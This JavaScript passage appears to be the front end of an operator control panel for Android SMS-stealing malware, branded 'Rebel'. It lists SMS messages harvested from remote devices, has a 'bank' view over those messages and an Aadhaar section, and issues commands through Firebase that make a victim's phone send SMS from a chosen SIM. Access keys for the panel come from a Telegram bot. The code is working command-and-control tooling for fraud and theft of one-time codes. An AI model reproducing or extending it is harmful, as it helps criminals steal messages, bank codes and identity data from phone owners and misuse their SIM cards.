    if(el)el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';
    return;
  }
  var show=finalizeSmsList(window_sms).slice(0,120);
  if(el){
    el.innerHTML=show.map(function(s,i){
    var out=s.type==='sent'||s.type==='outbox';
    return '<div class="sms-bubble '+(out?'out':'in')+'">'+
      '<div class="sms-from">'+esc(s.address)+'</div>'+
      esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
    }).join('');
    var scr=el.closest('.screen');
    if(scr)scr.scrollTop=0;
  }
}

function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
  if(!to||!msg){toast('Fill number and message',false);return;}
  var simSlot=_sendSimSlot||1;
  var btn=document.querySelector('.btn-send');
  document.getElementById('sendStatus').textContent='Sending via SIM '+simSlot+'...';
  if(btn){btn.classList.add('sending');btn.classList.remove('success');}
  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
  var payload={to:to,message:msg,from:simSlot,isSended:false};
  if(inst.schema!=='rabel'){
    path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
    payload={to:to,message:msg,sim:simSlot-1,from:simSlot,slot:simSlot-1};
  }
  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    if(btn){btn.classList.remove('sending');}
    if(r.ok){
      document.getElementById('sendStatus').textContent='✅ Sent from SIM '+simSlot;document.getElementById('sendMsg').value='';
      if(btn){btn.classList.add('success');setTimeout(function(){btn.classList.remove('success');},500);}
      spawnConfetti(innerWidth/2,innerHeight*.55,24);toast('SMS sent',true);
    }else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
  }).catch(function(){
    if(btn)btn.classList.remove('sending');
    document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);
  });
}

var TAB_ORDER=['home','device','sms','bank','send'],_lastTab='home';
function switchTab(name,btn){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
  var screen=document.getElementById('screen-'+name);
  if(screen)screen.classList.add('active');
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
  if(btn){btn.classList.add('active');moveNavGlow(btn);}
  else{
    var navBtn=document.querySelector('.nav-item[data-tab="'+name+'"]');
    if(navBtn){navBtn.classList.add('active');moveNavGlow(navBtn);}
  }
  _lastTab=name;
  if(name==='sms'){window_sms=[];_smsDataHash='';loadSmsForDevice(true);}
  else if(name==='bank')ensureSmsLoaded();
  if(name==='device')renderDeviceView();
  if(name==='send')updateSendForm();
}
function closeSideMenu(){
  var bg=document.getElementById('sideMenuBg'),menu=document.getElementById('sideMenu'),btn=document.getElementById('menuBtn');
  if(bg)bg.classList.remove('open');
  if(menu)menu.classList.remove('open');
  if(btn)btn.classList.remove('open');
}
function toggleSideMenu(){
  var menu=document.getElementById('sideMenu');
  if(menu&&menu.classList.contains('open')){closeSideMenu();return;}
  var bg=document.getElementById('sideMenuBg'),btn=document.getElementById('menuBtn');
  if(bg)bg.classList.add('open');
  if(menu)menu.classList.add('open');
  if(btn)btn.classList.add('open');
}
function menuGo(name){closeSideMenu();switchTab(name,null);}
function menuDevTab(name){
  closeSideMenu();
  if(!getSelDev()){toast('Select a device from Home first',false);menuGo('home');return;}
  switchTab('device',null);
  setTimeout(function(){
    var btn=document.querySelector('.dev-tab[data-tab="'+name+'"]');
    switchDevTab(name,btn);
  },40);
}
function menuOpenFb(){closeSideMenu();openFirebaseManager();}
function menuSwitchFb(){closeSideMenu();openFbSheet();}
function menuToggleAutoToken(){closeSideMenu();toggleAutoToken();}
function menuSetAutoDevice(){closeSideMenu();useSelForAutoToken();}
function menuOpenAadhar(){closeSideMenu();openAadhar();}
function menuRefresh(){closeSideMenu();refreshData();}
function menuUpdatePanel(){
  closeSideMenu();
  if(window.RebelAndroid&&RebelAndroid.checkForUpdate){
    toast('Checking panel update...',true);
    RebelAndroid.checkForUpdate();
  }else toast('Reopen app to update panel',false);
}
function menuLogout(){closeSideMenu();doLogout();}

/* AUTH — server keys via RebelAndroid (bot /genkey on @Rebelpanelbot) */
function parseJson(s){try{return JSON.parse(s);}catch(e){return null;}}
function authFetch(body){
  body=body||{};
  return new Promise(function(resolve){
    if(!window.RebelAndroid){resolve({ok:false,data:{ok:false,error:'Not in APK'}});return;}
    try{
      if(body.action==='login'){
        var j=parseJson(RebelAndroid.login(body.key||''));
        resolve({ok:!!(j&&j.ok),data:j||{ok:false,error:'Invalid key'}});
      }else if(body.action==='check'){
        var c=parseJson(RebelAndroid.checkSession());
        resolve({ok:!!(c&&c.ok),data:c||{ok:false}});
      }else if(body.action==='logout'){
        RebelAndroid.logout();
        resolve({ok:true,data:{ok:true}});
      }else resolve({ok:false,data:{ok:false}});
    }catch(e){resolve({ok:false,data:{ok:false,error:'Auth error'}});}
  });
}
function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
function unlockApp(token,exp,remember,accessKey){
  var key=normAccessKey(accessKey||getCurrentAccessKey());
  var s={token:token,exp:exp||0,key:key};
  if(key)bindAccessKey(key);
  if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
  var login=document.getElementById('loginScreen'),app=document.getElementById('appShell');
  var btn=document.getElementById('loginBtn');
  if(btn){var r=btn.getBoundingClientRect();spawnConfetti(r.left+r.width/2,r.top,48);}
  unlockFlash();
  login.classList.add('login-out');
  setTimeout(function(){
    login.classList.add('hidden');
    app.classList.remove('hidden');
    app.classList.add('app-enter');
    moveNavGlow(document.querySelector('.nav-item.active'));
    if(!panelReady){
      panelReady=true;
      if(!window._preloadStarted){fetchAllData();loadAutoTokenState();}
      updatePanelVersionBadge();
    }
  },380);
}
function doLogin(){
  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
  if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
  var btn=document.getElementById('loginBtn'),errEl=document.getElementById('loginErr');
  btn.disabled=true;btn.classList.add('loading');
  authFetch({action:'login',key:key}).then(function(res){
    btn.disabled=false;btn.classList.remove('loading');
    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked,res.data.key||key);return;}
    errEl.textContent=res.data&&res.data.error||'Invalid key';
    errEl.style.display='block';
    errEl.classList.remove('shake');void errEl.offsetWidth;errEl.classList.add('shake');
  });
}
function doLogout(){
  if(window.RebelAndroid)RebelAndroid.logout();
  localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
  localStorage.removeItem(ACCESS_KEY_STORAGE);
  location.reload();
}
document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});

/* AUTO TOKEN — stored inside APK */
var _autoTokenOn=false;
function smsTokenFetch(body){
  body=body||{};
  if(body.action==='get'||body.action==='save'){
    return panelApiFetch({
      type:'sms_token',
      sub_action:body.action==='get'?'get':'save',
      enabled:body.enabled,
      device_id:body.device_id,
      database_url:body.database_url,
      fb_name:body.fb_name
    }).then(function(d){
      if(d&&d.ok&&d.log)_smsTokenLog=d.log;
      renderAutoTokenLog(_smsTokenLog);
      return{ok:!!(d&&d.ok),data:d};
    });
  }
  return Promise.resolve({ok:false});
}
function loadAutoTokenState(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.data&&d.data.ok){
      _autoTokenOn=!!(d.data.config&&d.data.config.enabled);
      document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
      _smsTokenLog=d.data.log||[];
      renderAutoTokenLog(_smsTokenLog);
    }
  });
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
}
function useSelForAutoToken(){
  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
  var inst=getFbInstance(d.fbId);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
    toast('Auto SMS device set',true);
  });
}

/* BOOT */
(function(){
  var BOOT_MS=2600;
  function hideBoot(){
    var s=document.getElementById('bootSplash');
    if(!s)return;
    s.classList.add('hide');
    setTimeout(function(){if(s.parentNode)s.parentNode.removeChild(s);},500);
  }
  function initFx(){
    initParallax();bindRipples();initScrollPerf();
    var nb=document.querySelector('.nav-item.active');if(nb)moveNavGlow(nb);
    requestAnimationFrame(function(){requestAnimationFrame(initParticles);});
  }
  function bootDone(){
    if(window.RebelAndroid&&RebelAndroid.splashAlreadyShown&&RebelAndroid.splashAlreadyShown()){
      return 600;
    }
    return BOOT_MS;
  }
  var IS_PRELOAD=/[?&]preload=1/.test(location.search)||(window.RebelAndroid&&RebelAndroid.isPreload&&RebelAndroid.isPreload());
  if(IS_PRELOAD){
    window.addEventListener('load',function(){startPanelPreload();});
    return;
  }
  window.addEventListener('load',function(){
    updatePanelVersionBadge();
    var ms=bootDone();
    var hasSession=false,sessionData=null;
    if(window.RebelAndroid){
      sessionData=parseJson(RebelAndroid.checkSession());
      if(sessionData&&sessionData.ok&&sessionData.token){
        hasSession=true;
      }
    }
    setTimeout(hideBoot,ms);
    setTimeout(initFx,ms);
    if(hasSession&&sessionData){
      setTimeout(function(){unlockApp(sessionData.token,sessionData.expires||sessionData.exp||0,true,sessionData.key);},ms);
    }
  });
})();